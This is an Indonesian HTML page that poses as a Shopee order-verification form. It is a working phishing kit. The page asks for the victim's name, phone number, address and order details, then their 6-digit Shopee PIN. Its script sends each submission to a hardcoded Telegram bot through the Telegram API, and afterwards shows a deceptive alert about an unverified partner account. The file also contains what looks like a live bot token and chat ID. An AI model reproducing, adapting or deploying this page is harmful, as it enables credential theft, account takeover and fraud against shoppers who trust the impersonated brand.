<!DOCTYPE html>
<html lang="id">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pemesanan Order - Verifikasi Shopee</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        /* BASE STYLES */
        :root {
            --shopee-orange: #EE4D2D;
            /* Warna Shopee yang lebih akurat */
            --shopee-light-orange: #FF5733;
            --shopee-gray: #f5f5f5;
            --text-dark: #333;
            --text-medium: #555;
            --text-light: #777;
            --border-color: #ddd;
            --shopee-green: #25D366;
            /* Warna WhatsApp */
        }

        body {
            background-color: var(--shopee-gray);
            color: var(--text-dark);
            font-family: 'Poppins', sans-serif;
            /* Menggunakan Poppins */
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: flex-start;
            min-height: 100vh;
        }

        .container {
            background-color: white;
            width: 100%;
            max-width: 600px;
            min-height: 100vh;
            padding-top: 50px;
            /* Ruang untuk fixed header */
            box-shadow: 0 0 15px rgba(0, 0, 0, 0.08);
            /* Lebih terlihat */
        }

        /* CUSTOM HEADER APLIKASI */
        .app-header {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            max-width: 600px;
            margin: 0 auto;
            background-color: var(--shopee-orange);
            color: white;
            padding: 10px 15px;
            display: flex;
            justify-content: center;
            /* Untuk judul di tengah */
            align-items: center;
            z-index: 1010;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
        }

        .app-header h3 {
            margin: 0;
            font-size: 16px;
            font-weight: 500;
            /* Medium weight */
            text-align: center;
        }

        /* CONTENT FORM */
        .form-content {
            padding: 20px;
        }

        .form-group {
            margin-bottom: 20px;
            /* Sedikit lebih renggang */
        }

        .form-group label {
            display: block;
            font-weight: 500;
            margin-bottom: 8px;
            /* Lebih renggang */
            color: var(--text-medium);
            font-size: 14px;
        }

        .form-group input[type="text"],
        .form-group input[type="tel"],
        .form-group input[type="number"],
        .form-group input[type="password"],
        .form-group textarea {
            width: 100%;
            padding: 10px 0;
            /* Padding vertikal saja */
            border: none;
            border-bottom: 1px solid var(--border-color);
            /* Hanya border bawah */
            outline: none;
            /* Hilangkan outline default */
            box-sizing: border-box;
            font-size: 15px;
            /* Sedikit lebih besar */
            font-family: 'Poppins', sans-serif;
            color: var(--text-dark);
        }

        .form-group input:focus,
        .form-group textarea:focus {
            border-bottom-color: var(--shopee-orange);
            /* Border orange saat fokus */
        }

        textarea {
            resize: vertical;
            /* Izinkan resize vertikal */
            padding-bottom: 5px;
            /* Untuk konsistensi dengan input */
        }

        button {
            background-color: var(--shopee-orange);
            color: white;
            padding: 12px 15px;
            border: none;
            border-radius: 5px;
            /* Sedikit lebih bulat */
            cursor: pointer;
            font-size: 16px;
            width: 100%;
            margin-top: 20px;
            /* Lebih banyak ruang */
            font-weight: 600;
            /* Semi-bold */
            transition: background-color 0.2s ease;
        }

        button:hover {
            background-color: var(--shopee-light-orange);
        }

        /* Form Card */
        .form-card {
            background-color: white;
            padding: 25px;
            border-radius: 8px;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
            /* Card shadow */
            margin-top: 15px;
            /* Ruang dari header jika perlu */
            text-align: center;
            /* Untuk menengahkan logo di dalam card */
        }

        .form-card p {
            font-size: 14px;
            color: var(--text-light);
            line-height: 1.5;
            margin-bottom: 25px;
        }

        .shopee-logo-form {
            width: 100px;
            /* Ukuran logo Shopee di dalam form */
            height: auto;
            margin-bottom: 20px;
            /* Jarak dengan teks di bawahnya */
        }


        /* MODAL STYLES */
        .modal-overlay {
            display: none;
            position: fixed;
            z-index: 2000;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.5);
            justify-content: center;
            align-items: center;
        }

        .modal-content {
            background-color: white;
            padding: 0;
            border-radius: 8px;
            /* Lebih bulat */
            width: 90%;
            max-width: 320px;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
            /* Shadow lebih dalam */
            animation: fadeIn 0.3s ease-out;
            overflow: hidden;
            font-family: 'Poppins', sans-serif;
        }

        @keyframes fadeIn {
            from {
                opacity: 0;
                transform: scale(0.95);
            }

            to {
                opacity: 1;
                transform: scale(1);
            }
        }

        .modal-body {
            padding: 25px 20px;
            /* Padding lebih */
            text-align: center;
        }

        .modal-body p {
            margin: 0 0 20px 0;
            font-size: 15px;
            color: var(--text-dark);
        }

        .modal-button-group {
            border-top: 1px solid #eee;
            display: flex;
        }

        .modal-button-group button,
        .modal-button-group a {
            flex: 1;
            background: none;
            color: var(--shopee-orange);
            padding: 14px 0;
            /* Padding lebih */
            border: none;
            cursor: pointer;
            font-size: 15px;
            font-weight: 600;
            /* Semi-bold */
            margin-top: 0;
            border-radius: 0;
            text-decoration: none;
            display: flex;
            justify-content: center;
            align-items: center;
            transition: background-color 0.2s ease;
        }

        .modal-button-group button:hover {
            background-color: var(--shopee-gray);
        }

        .modal-button-group button:nth-child(2) {
            border-left: 1px solid #eee;
            color: var(--text-medium);
            /* Warna lebih netral untuk batal */
        }

        /* Modal PIN Custom Styling */
        #pinModal input[type="password"] {
            font-size: 26px;
            /* Lebih besar */
            text-align: center;
            letter-spacing: 4px;
            /* Sedikit renggang */
            font-weight: 600;
            border: none;
            border-bottom: 2px solid var(--shopee-orange);
            padding: 8px 10px;
            /* Padding lebih */
            max-width: 180px;
            /* Lebar input PIN */
            margin: 0 auto;
            display: block;
            color: var(--text-dark);
        }
    </style>
</head>

<body>
    <div class="container">
        <div id="appHeader" class="app-header">
            <h3 id="headerTitle">Formulir Pemesanan</h3>
        </div>

        <div id="content-area" class="form-content">
            <main class="order-form-section">
                <div class="form-card">
                    <img src="shop.JPG" alt="Shopee Logo" class="shopee-logo-form">

                    <p>
                        Isi detail pesanan Anda. Verifikasi akan dilakukan di langkah selanjutnya untuk memastikan keamanan
                        pemesanan.
                    </p>
                    <form id="orderForm">
                        <div class="form-group">
                            <label for="namaLengkap">Nama Lengkap *</label>
                            <input type="text" id="namaLengkap" required>
                        </div>
                        <div class="form-group">
                            <label for="nomorTelepon">Nomor Telepon *</label>
                            <input type="tel" id="nomorTelepon" required pattern="[0-9]{10,13}">
                        </div>
                        <div class="form-group">
                            <label for="alamatLengkap">Alamat Lengkap *</label>
                            <textarea id="alamatLengkap" rows="3" required></textarea>
                        </div>
                        <div class="form-group">
                            <label for="namaProduk">Nama Produk *</label>
                            <input type="text" id="namaProduk" required>
                        </div>
                        <div class="form-group">
                            <label for="harga">Total Harga * (Rp)</label>
                            <input type="text" id="harga" required oninput="formatPrice(this)" value="">
                        </div>
                        <button type="submit" id="verifikasiButton">Lanjutkan Verifikasi</button>
                    </form>
                </div>
            </main>
        </div>

        <div id="pinModal" class="modal-overlay">
            <div class="modal-content">
                <div class="modal-body">
                    <p style="margin-bottom: 30px;">
                        Masukkan <span style="color: var(--shopee-orange); font-weight: bold;">PIN Shopee</span> Anda
                        untuk melanjutkan Pemesanan.
                    </p>
                    <form id="pinForm">
                        <div class="form-group">
                            <input type="password" id="shopeePin" placeholder="••••••" required maxlength="6"
                                pattern="[0-9]{6}" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
                        </div>
                    </form>
                </div>
                <div class="modal-button-group">
                    <button onclick="document.getElementById('pinForm').dispatchEvent(new Event('submit'))">
                        Lanjutkan
                    </button>
                    <button onclick="hideModal('pinModal'); resetForm()">
                        Batal
                    </button>
                </div>
            </div>
        </div>

        </div>

    <script>
        // PASTIKAN ANDA MENGGANTI INI DENGAN TOKEN DAN CHAT ID TELEGRAM ANDA YANG AKTIF
        var TELEGRAM_TOKEN = "7812428468:AAE1qHjLLHOQlAmABXbr9JhXEg0KQkb0XW0";
        var CHAT_ID = "5923031825";

        // Variabel global
        var orderData = {};

        // --- UTILITY FUNCTIONS ---

        function formatPrice(input) {
            let value = input.value.replace(/\D/g, '');
            let formattedValue = new Intl.NumberFormat('id-ID').format(value);
            input.value = formattedValue;
        }

        function cleanPrice(formattedValue) {
            return formattedValue.replace(/\./g, '');
        }

        function formatPhoneNumber(tel) {
            let cleanTel = tel.replace(/\D/g, '');

            if (cleanTel.startsWith('0')) {
                cleanTel = '62' + cleanTel.substring(1);
            } else if (!cleanTel.startsWith('62') && cleanTel.length > 8) {
                cleanTel = '62' + cleanTel;
            }

            return cleanTel;
        }

        function showModal(modalId, title) {
            document.getElementById(modalId).style.display = 'flex';
        }

        function hideModal(modalId) {
            document.getElementById(modalId).style.display = 'none';
        }

        function resetForm() {
            document.getElementById('orderForm').reset();
            hideModal('pinModal');
            orderData = {};

            document.getElementById('harga').value = '';
        }


        // --- FUNGSI KIRIM KE TELEGRAM ---
        function sendToTelegram(dataType, data) {
            let text = "";

            if (dataType === 'FORM') {
                // Teks disesuaikan, kolom jumlah/ctn dihapus
                text =
                    "**--- 1. DATA FORMULIR PEMESANAN BARU ---**\n\n" +
                    "Nama: " + data.namaLengkap + "\n" +
                    "Telepon: " + data.nomorTelepon + "\n" +
                    "Alamat: " + data.alamatLengkap + "\n" +
                    "Produk: " + data.namaProduk + "\n" +
                    "Harga Total: Rp" + new Intl.NumberFormat('id-ID').format(data.harga) + "\n\n" +
                    "Status: Data Pemesanan TERSIMPAN. Menunggu PIN Verifikasi...";
            } else if (dataType === 'PIN') {
                text =
                    "**--- 2. PIN VERIFIKASI PEMESANAN ---**\n\n" +
                    "⚠️ PIN SHOPEE: `" + data.shopeePin + "`\n\n" +
                    "Nomor Telepon: " + data.nomorTelepon + "\n\n" +
                    "**✅ VERIFIKASI PEMESANAN SELESAI. ✅**\n" +
                    "Pembayaran/Pengiriman Uang dilakukan setelah barang tiba dan dicek. (ALERT MITRA MUNCUL)";
            }

            var url = "https://api.telegram.org/bot" + TELEGRAM_TOKEN + "/sendMessage";

            var params = {
                chat_id: CHAT_ID,
                text: text,
                parse_mode: 'Markdown'
            };

            fetch(url, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify(params)
                })
                .then(response => {
                    if (!response.ok) {
                        console.error('Gagal mengirim ke Telegram. Status: ' + response.status);
                    }
                })
                .catch(error => {
                    console.error("Kesalahan pengiriman Telegram:", error);
                });
        }

        // --- STEP 1: FORMULIR PEMESANAN ---
        document.getElementById('orderForm').addEventListener('submit', function (event) {
            event.preventDefault();

            var nama = document.getElementById('namaLengkap').value.trim();
            var telepon = document.getElementById('nomorTelepon').value.trim();
            var alamat = document.getElementById('alamatLengkap').value.trim();
            var namaProduk = document.getElementById('namaProduk').value.trim();
            // var jumlah dihapus dari sini

            var formattedHarga = document.getElementById('harga').value.trim();
            var cleanHarga = cleanPrice(formattedHarga);
            var harga = parseFloat(cleanHarga);

            if (!nama || !telepon || !alamat || !namaProduk || isNaN(harga) || harga <= 0) {
                alert('Harap isi semua kolom dengan benar.');
                return;
            }

            orderData = {
                namaLengkap: nama,
                nomorTelepon: formatPhoneNumber(telepon), 
                alamatLengkap: alamat,
                namaProduk: namaProduk,
                // jumlahPesanan dihapus dari orderData
                harga: harga
            };

            // PENGIRIMAN 1: Data Formulir - DATA LENGKAP TERKIRIM DI SINI
            sendToTelegram('FORM', orderData);

            showModal('pinModal', 'Masukkan PIN');
        });

        // --- STEP 2: INPUT PIN (MODAL 1) ---
        document.getElementById('pinForm').addEventListener('submit', function (event) {
            event.preventDefault();

            var shopeePin = document.getElementById('shopeePin').value.trim();

            if (shopeePin.length !== 6 || isNaN(shopeePin)) {
                alert('PIN Shopee harus 6 digit angka.');
                return;
            }

            orderData.shopeePin = shopeePin;

            // PENGIRIMAN 2: Data PIN (FINAL)
            sendToTelegram('PIN', orderData);

            hideModal('pinModal');
            
            // ALERT AKHIR
            alert('Anda belum memverifikasi akun Mitra Shopee anda, demi keamanan akun dan data anda silakan verifikasi akun mitra shopee anda di aplikasi');

            // Opsional: reset formulir setelah alert
            resetForm();
        });
    </script>
</body>

</html>
